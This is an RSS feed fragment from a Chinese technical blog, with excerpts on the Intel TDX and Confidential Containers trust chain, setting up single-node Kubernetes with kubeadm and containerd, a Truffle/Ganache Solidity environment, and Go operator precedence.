+&lt;p&gt;本文将基于Intel TDX技术，来分析Confidential Contianers（简称CoCo）项目的安全性。CoCo项目是一个开源项目，它基于流行的Kata Containers项目做了增强，在其上增加了机密计算能力，安全性从单向保护（防止基础设施受到上层workload侵害），扩展到了双向保护（同时可以保护workload免受基础设施窥探）。&lt;/p&gt;
+&lt;p&gt;本文将介绍Intel TDX的可信启动流程，串联到CoCo的启动流程，进而通过信任链的传递角度来分析CoCo及TDX的安全性。&lt;/p&gt;
+&lt;p&gt;本文对阅读对象做了如下假设：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;了解TDX是什么，应用于什么场景，对TDX有至少一定的了解。&lt;/li&gt;
+&lt;li&gt;听说过CoCo项目，大致知道CoCo是什么，应用于什么场景。&lt;/li&gt;
+&lt;li&gt;了解Kata Containers是什么，对Kata Containers有一定了解。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;基于以上假设，本文不对CoCo和TDX做太多科普工作，前置知识的获得交给用户自己去完成。本文着重来分析CoCo的可信链条，对应的源码仓库在&lt;a href="https://weizhang555.github.io/original/tdx-trust-chain/#refdoc"&gt;参考文档&lt;/a&gt;中有给出。&lt;/p&gt;
+&lt;p&gt;以下是正文。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="tdx基本介绍"&gt;TDX基本介绍&lt;/h2&gt;
+&lt;p&gt;Intel给CPU加了个新的模式，叫SEAM （安全仲裁模式，Secure-Arbitration Mode, SEAM），执行 Intel 提供的、经过数字签名但未加密的安全服务模块，Intel TDX 模块位于由 SEAM-range 寄存器（SEAMRR）指定的保留内存空间中，CPU 仅允许访问SEAM模式的软件访问这段内容，其他所有软件和 DMA 都无法访问。SEAM 对其他受保护的区域如 SMM 和 SGX 保护的内存没有访问权限。&lt;/p&gt;
+&lt;p&gt;增加了SEAM mode之后，原先的VMM的模式从2个扩展到4个：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VMX-root&lt;/li&gt;
+&lt;li&gt;VMX-non-root&lt;/li&gt;
+&lt;li&gt;SEAM-VMX-root（新增）&lt;/li&gt;
+&lt;li&gt;SEAM-VMX-non-root（新增）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Intel TDX 为 TD 提供了以下功能：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;内存机密性和完整性（MKTME private key加密内存）&lt;/li&gt;
+&lt;li&gt;地址转换完整性（secure EPT）&lt;/li&gt;
+&lt;li&gt;CPU 状态机密性和完整性(寄存器状态 &amp;amp; VMCS 保存与恢复)&lt;/li&gt;
+&lt;li&gt;安全中断和异常传递(virtual APIC)&lt;/li&gt;
+&lt;li&gt;远程认证（remote attestation）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;具体参考whitepaper，不详细展开了。&lt;/p&gt;
+&lt;img src="https://weizhang555.github.io/static/images/post/tdx/tdx-coco-12.png" width=400 height=400 /&gt;
+&lt;h2 id="加载seamldr及tdx-module"&gt;加载SEAMLDR及TDX module&lt;/h2&gt;
+&lt;p&gt;TDX功能的启用始于Intel TDX模块，信任根在于CPU。&lt;/p&gt;
+&lt;p&gt;Intel TDX module加载流程如下：&lt;/p&gt;</description></item><item><title>kubeadm拉起单节点K8s(新版)</title><link>https://weizhang555.github.io/original/k8s-setup-2/</link><pubDate>Tue, 17 Oct 2023 20:18:00 +0800</pubDate><guid>https://weizhang555.github.io/original/k8s-setup-2/</guid><description>
+&lt;p&gt;由于国内网络环境特殊，使用kubeadm拉起K8s集群也变成了一件有技巧的事情。&lt;/p&gt;
+&lt;p&gt;本文介绍如何“科学”的使用kubeadm拉起一个单节点的K8s集群。&lt;/p&gt;
+&lt;p&gt;主要还是参考官网：https://kubernetes.io/docs/setup/&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="1安装容器运行时"&gt;1.安装容器运行时&lt;/h2&gt;
+&lt;p&gt;参考&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;容器运行时：https://kubernetes.io/zh/docs/setup/production-environment/container-runtimes/&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;结论：此处我们选用containerd，cgroup驱动选择systemd，cgroup v2/v1我们不做偏好设置。&lt;/p&gt;
+&lt;h3 id="11-设置docker-repo-source"&gt;1.1 设置Docker repo source&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ca&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;certificates&lt;/span&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;3&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;curl&lt;/span&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;4&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;gnupg&lt;/span&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;5&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;lsb&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;release&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;6&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;fsSL&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;docker&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;linux&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ubuntu&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;gpg&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;gpg&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dearmor&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;keyrings&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;docker&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;archive&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;keyring&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;7&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;tee&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sources&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;docker&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;8&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="12-安装containerd"&gt;1.2 安装containerd&lt;/h3&gt;
+&lt;p&gt;查看containerd可用版本（可选）。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;apt-cache madison containerd.io
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;apt-mark hold containerd.io
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装containerd。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;sudo apt install -y containerd.io=1.4.11-1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;测试下是否能下载镜像且运行。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;sudo ctr image pull docker.io/library/alpine:latest
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;sudo ctr run -t docker.io/library/alpine:latest test sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="13-为对接k8s做必要的配置"&gt;1.3 为对接K8s做必要的配置&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;EOF&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;tee&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nb"&gt;load&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;containerd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 2&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;overlay&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 3&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;br_netfilter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 4&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 5&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 6&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;modprobe&lt;/span&gt; &lt;span class="n"&gt;overlay&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 7&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;modprobe&lt;/span&gt; &lt;span class="n"&gt;br_netfilter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 8&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 9&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 设置必需的 sysctl 参数，这些参数在重新启动后仍然存在。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;10&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;EOF&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;tee&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sysctl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;kubernetes&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cri&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;11&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;net&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bridge&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bridge&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;nf&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;12&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;net&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ipv4&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ip_forward&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;13&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;net&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bridge&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bridge&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;nf&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ip6tables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;14&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;15&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;16&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 应用 sysctl 参数而无需重新启动&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;17&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;sysctl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配置containerd并重启&lt;/p&gt;</description></item><item><title>Solidity入门：基于Truffle搭建本地开发环境</title><link>https://weizhang555.github.io/original/learn-solidity/</link><pubDate>Fri, 03 Jun 2022 22:08:00 +0800</pubDate><guid>https://weizhang555.github.io/original/learn-solidity/</guid><description>
+&lt;h2 id="怎样开始solidity的学习"&gt;怎样开始Solidity的学习&lt;/h2&gt;
+&lt;p&gt;最近在学习区块链、智能合约相关知识，发现Solidity权威的学习资料很匮乏，很奇怪Solidity这么火竟然没有官方的详细学习资料，比如《Solidity Cookbook》这类书籍。&lt;/p&gt;
+&lt;p&gt;这篇文章是Solidity入门的入门文档，介绍如何搭建本地环境搭建。我个人也是新手，多年的语言学习体验还是习惯先有个本地的开发环境，&lt;a href="https://ethereum.org/en/"&gt;Ethereum官方&lt;/a&gt;推荐的学习工具列举在下面：https://ethereum.org/zh/developers/learning-tools/ ，其中Remix我看到很多人在推荐，如果喜欢在线编码的话可以直接使用。&lt;/p&gt;
+&lt;p&gt;另外，Solidity的入门学习材料推荐以下两个：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href="https://cryptozombies.io/"&gt;CryptoZombie&lt;/a&gt; 讲的很泛但是方方面面都介绍到了，很适合建立初步的体感。&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://solidity-by-example.org"&gt;Solidity By Example&lt;/a&gt; 我正在看，例子很多，但是貌似也没有介绍的很深入。&lt;/li&gt;
+&lt;li&gt;需要更加Advanced的学习资料。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Solidity本地环境我个人选择Truffle，我也是新手，如果大家有更好的推荐可以在评论区推荐给我，谢谢~&lt;/p&gt;
+&lt;h2 id="truffle环境搭建"&gt;Truffle环境搭建&lt;/h2&gt;
+&lt;p&gt;主要参考Truffle官方Quick Start：https://trufflesuite.com/docs/truffle/quickstart/&lt;/p&gt;
+&lt;p&gt;安装很简单：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;$ npm install -g truffle
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;强烈推荐安装Ganache，Ganache可以在本地启动一个带UI的eth链，带10个测试账号，每个账号有100个eth供测试用。&lt;/p&gt;
+&lt;img src="https://weizhang555.github.io/static/images/post/truffle-1.png" width=800 height=800 /&gt;
+&lt;p&gt;虽然Truffle也会启动本地的eth测试链，但是有个UI界面的Ganache还是很直观的，方便学习。&lt;/p&gt;
+&lt;p&gt;Ganache建议安装支持Filecoin的最新版本，虽然我们还没用到Filecoin，但是提前准备总是没错的。&lt;/p&gt;
+&lt;p&gt;参考：https://trufflesuite.com/docs/ganache/quickstart/#1-install-ganache&lt;/p&gt;
+&lt;p&gt;所有可用的版本列表：https://github.com/trufflesuite/ganache-ui/releases&lt;/p&gt;
+&lt;p&gt;手动安装最新版本，我用的版本是2.6.0-beta.3.1390，&lt;a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/79269625/2280be80-93f7-11eb-8bc5-2a7862e546bf?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220524%2Fus-east-1%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20220524T123543Z&amp;amp;X-Amz-Expires=300&amp;amp;X-Amz-Signature=344e8589ec865396b7f650befadc3d10ab0a8e3cccd70662aeca7bd1b9a2ff80&amp;amp;X-Amz-SignedHeaders=host&amp;amp;actor_id=1203611&amp;amp;key_id=0&amp;amp;repo_id=79269625&amp;amp;response-content-disposition=attachment%3B%20filename%3DGanache-2.6.0-beta.3-mac.dmg&amp;amp;response-content-type=application%2Foctet-stream"&gt;下载地址&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id="truffle一些操作技巧及常用命令"&gt;Truffle一些操作技巧及常用命令&lt;/h2&gt;
+&lt;p&gt;参考：https://trufflesuite.com/docs/truffle/quickstart/&lt;/p&gt;
+&lt;p&gt;Truffle Quick Start里面的例子使用的MetaCoin，我们这里从truffle init开始建一个新的truffle工程。&lt;/p&gt;
+&lt;h3 id="1-创建工程"&gt;1. 创建工程&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;$ mkdir test
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;$ cd test
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;3&lt;/span&gt;&lt;span class="cl"&gt;$ truffle init
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看目录树：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 1&lt;/span&gt;&lt;span class="cl"&gt;$ tree .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 2&lt;/span&gt;&lt;span class="cl"&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 3&lt;/span&gt;&lt;span class="cl"&gt;├── contracts
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 4&lt;/span&gt;&lt;span class="cl"&gt;│   └── Migrations.sol
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 5&lt;/span&gt;&lt;span class="cl"&gt;├── migrations
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 6&lt;/span&gt;&lt;span class="cl"&gt;│   └── 1_initial_migration.js
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 7&lt;/span&gt;&lt;span class="cl"&gt;├── test
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 8&lt;/span&gt;&lt;span class="cl"&gt;└── truffle-config.js
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 9&lt;/span&gt;&lt;span class="cl"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;10&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;11&lt;/span&gt;&lt;span class="cl"&gt;3 directories, 3 files
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2-启动ganache测试链"&gt;2. 启动Ganache测试链&lt;/h3&gt;
+&lt;img src="https://weizhang555.github.io/static/images/post/truffle-2.png" width=800 height=800 /&gt;
+&lt;img src="https://weizhang555.github.io/static/images/post/truffle-3.png" width=800 height=800 /&gt;
+&lt;img src="https://weizhang555.github.io/static/images/post/truffle-4.png" width=800 height=800 /&gt;
+&lt;h3 id="3-配置truffle-project连接到ganache-ui"&gt;3. 配置Truffle Project连接到Ganache UI&lt;/h3&gt;
+&lt;p&gt;图片里可以看到，Ganache的监听地址为http://127.0.0.1:7545 ，我们把这个地址配置到&lt;code&gt;truffle-config.js&lt;/code&gt;里。&lt;/p&gt;</description></item><item><title>最准确的Go语言运算符优先级介绍</title><link>https://weizhang555.github.io/original/go-operators-priority/</link><pubDate>Fri, 18 Mar 2022 11:24:00 +0800</pubDate><guid>https://weizhang555.github.io/original/go-operators-priority/</guid><description>
+&lt;h2 id="前言"&gt;前言&lt;/h2&gt;
+&lt;p&gt;写Go代码时一下子想不起准确的运算符优先级了，Google搜索了下，发现前面几个SEO做的比较好的网址给的要不就是错的，要不就是写的乱七八糟，误人子弟。喷的就是下面这几个出错的：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://haicoder.net/golang/golang-operator-precedence.html"&gt;https://haicoder.net/golang/golang-operator-precedence.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://c.biancheng.net/view/5559.html"&gt;http://c.biancheng.net/view/5559.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://gitbook.net/go/go_operators_precedence.html"&gt;http://gitbook.net/go/go_operators_precedence.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这几个基本上是互相抄的，没有验证，很容易反驳。比如，上面说&amp;quot;+&amp;quot;, &amp;quot;-&amp;quot;的优先级大于“|”，那么以下代码&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;a := 2 | 4 - 1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;的结果应该等同于&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;a := 2 | (4 - 1)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但实际上前者结果为5，后者的答案是3。原因是“-”运算符优先级与“|”实际上是相等的。&lt;/p&gt;
+&lt;p&gt;验证链接： &lt;a href="https://go.dev/play/p/fPFNO8r6bJ3"&gt;https://go.dev/play/p/fPFNO8r6bJ3&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;简单分享下正确的运算符优先级，避免后人踩坑。&lt;/p&gt;
+&lt;h2 id="正确的运算符优先级"&gt;正确的运算符优先级&lt;/h2&gt;
+&lt;p&gt;Google找到了官方的说明：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://go.dev/ref/spec"&gt;https://go.dev/ref/spec&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;可以参考其中Operator Precedence一节，介绍的非常清楚。&lt;/p&gt;
+&lt;ol&gt;
